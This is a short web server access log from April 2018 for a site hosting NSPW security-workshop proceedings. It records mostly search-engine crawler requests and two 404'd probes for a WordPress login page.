66.249.73.87 - - [30/Apr/2018:19:08:28 -0400] "GET /modules/user/user.css?nhfa6e HTTP/1.1" 200 1062 "http://pinter.ccsl.carleton.ca/proceedings" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [30/Apr/2018:19:08:29 -0400] "GET /themes/garland/print.css?nhfa6e HTTP/1.1" 200 4165 "http://pinter.ccsl.carleton.ca/proceedings" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [30/Apr/2018:19:09:28 -0400] "GET /2001/pc.html HTTP/1.1" 200 5323 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:19:09:31 -0400] "GET /papers/1994/?C=D;O=D HTTP/1.1" 200 950 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
180.76.15.157 - - [30/Apr/2018:19:09:34 -0400] "GET /2001 HTTP/1.1" 301 3971 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.148 - - [30/Apr/2018:19:09:35 -0400] "GET /2001/ HTTP/1.1" 200 6723 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
49.145.102.170 - - [30/Apr/2018:19:11:59 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
49.145.102.170 - - [30/Apr/2018:19:12:00 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [30/Apr/2018:19:12:03 -0400] "GET /2009/proceedings/2005/nspw2005-flechais.pdf HTTP/1.1" 200 2796418 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.236 - - [30/Apr/2018:19:12:05 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
129.60.39.117 - - [30/Apr/2018:19:12:44 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "http://www.nspw.org/2017/program" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
196.249.99.56 - - [30/Apr/2018:19:12:55 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
196.249.99.56 - - [30/Apr/2018:19:12:56 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
216.244.66.236 - - [30/Apr/2018:19:13:35 -0400] "GET /papers/2001/nspw2001-schaefer.pdf HTTP/1.1" 200 405671 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
40.77.167.169 - - [30/Apr/2018:19:15:25 -0400] "GET /papers/2002/nspw2002-ashley.pdf HTTP/1.1" 200 663028 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
